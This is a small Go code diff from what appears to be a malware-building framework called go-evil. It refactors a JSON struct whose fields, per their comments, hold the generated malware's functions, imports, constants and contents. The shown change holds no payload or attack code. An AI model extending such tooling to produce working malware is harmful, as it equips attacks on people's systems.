@@ -3,6 +3,7 @@ package json
 import (
 	compilevar "github.com/TeamPhoneix/go-evil/utility/structure/compile_var"
 	"github.com/TeamPhoneix/go-evil/utility/structure/functions"
+	"github.com/TeamPhoneix/go-evil/utility/structure/structs"
 )
 
 type Json_t struct {
@@ -15,11 +16,11 @@ type Json_t struct {
 	Functions []functions.Func_t `json:"file_functions"` // A structure containing all functions def in the files
 
 	// The malwares actual code will be found here
-	GO_functions []string `json:"go_functions"` // Contains all the real go-code functions for the malware
-	GO_imports   []string `json:"go_imports"`   // Contains all imports needed for the malware to work
-	GO_const     []string `json:"go_const"`     // Contains all consts needed for the malware to work
-	GO_global    []string `json:"go_global"`    // Contains all globals needed for the malware to work
-	GO_struct    []string `json:"go_struct"`    // Contains all structs
+	GO_functions []functions.Go_func_t `json:"go_functions"` // Contains all the real go-code functions for the malware
+	GO_imports   []string              `json:"go_imports"`   // Contains all imports needed for the malware to work
+	GO_const     []string              `json:"go_const"`     // Contains all consts needed for the malware to work
+	GO_global    []string              `json:"go_global"`    // Contains all globals needed for the malware to work
+	GO_struct    []structs.Go_struct_t `json:"go_struct"`    // Contains all structs
 
 	// Malware content
 	Malware_gut      []string `json:"malware_gut"`     // The contents of the malware file
